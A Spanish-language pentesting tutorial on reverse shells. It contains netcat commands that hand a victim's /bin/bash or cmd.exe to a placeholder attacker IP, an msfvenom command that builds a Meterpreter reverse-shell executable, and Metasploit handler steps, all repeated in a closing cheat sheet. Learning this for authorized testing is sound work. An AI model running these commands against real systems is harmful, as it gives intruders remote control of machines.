# Reverse Shells

## 1. ¿Qué es una Reverse Shell?
Una **Reverse Shell** es un tipo de conexión remota en la que **la máquina víctima inicia la conexión hacia el atacante**, enviando acceso a su propia shell.

En otras palabras:
- La **víctima** actúa como **cliente**.
- El **atacante** actúa como **servidor** que escucha.

---

## 2. ¿Para qué sirve?
- Acceder remotamente a un sistema detrás de **NAT** o **firewall** que bloquea conexiones entrantes.
- Es el método **más común** en pentesting porque funciona en la mayoría de entornos.
- Facilita evadir restricciones de red (la víctima hace una conexión saliente).

---

## 3. Funcionamiento
1. El **atacante** abre un puerto a la escucha.
2. La **víctima** ejecuta un comando/payload que se conecta a ese puerto.
3. La conexión otorga una shell remota al atacante.

---

## 4. Ejemplo con Netcat

### En el atacante (servidor que escucha)
```bash
# Linux o Windows
nc -lvp 4444
```

### En la víctima (cliente que se conecta)
```bash
# Linux
nc <IP_atacante> 4444 -e /bin/bash

# Windows
nc.exe <IP_atacante> 4444 -e cmd.exe
```
- `-e` → ejecuta el programa indicado y lo redirige a la conexión.

---

## 5. Ejemplo con msfvenom (Reverse Shell Payload)

### Crear payload para Windows
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP_atacante> LPORT=4444 -f exe > reverse.exe
```
- `windows/meterpreter/reverse_tcp` → Payload reverse shell con Meterpreter.
- `LHOST` → IP del atacante que recibirá la conexión.
- `LPORT` → Puerto en el atacante que recibirá la conexión.
- `-f exe` → Formato ejecutable para Windows.

---

## 6. Uso en Metasploit

1. Configurar **multi/handler**:
```bash
msfconsole
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST <IP_atacante>
set LPORT 4444
exploit
```
2. Esperar la conexión de la víctima y obtener una sesión Meterpreter.

---

## 7. Ventajas y Desventajas

**Ventajas:**
- Funciona incluso si la víctima está detrás de NAT/firewall (puertos salientes permitidos).
- Más difícil de detectar en un escaneo de puertos.

**Desventajas:**
- Depende de que la víctima pueda hacer conexiones salientes al puerto especificado.
- Puede ser bloqueado si hay un proxy estricto o filtrado de tráfico.

---

## 8. Comparación con Bind Shell
| Característica      | Bind Shell | Reverse Shell |
|---------------------|------------|---------------|
| Quién inicia conexión | Atacante  | Víctima       |
| Problemas con NAT   | Sí         | Menos probable|
| Uso común en pentesting | Menos frecuente | Muy frecuente |

---

## 9. Comandos clave

```bash
# Reverse Shell con Netcat
# Atacante (escucha)
nc -lvp 4444
# Víctima (ejecuta conexión)
nc <IP_atacante> 4444 -e /bin/bash

# Reverse Shell Windows con msfvenom
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP_atacante> LPORT=4444 -f exe > reverse.exe

# Escuchar con multi/handler en Metasploit
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST <IP_atacante>
set LPORT 4444
exploit
```

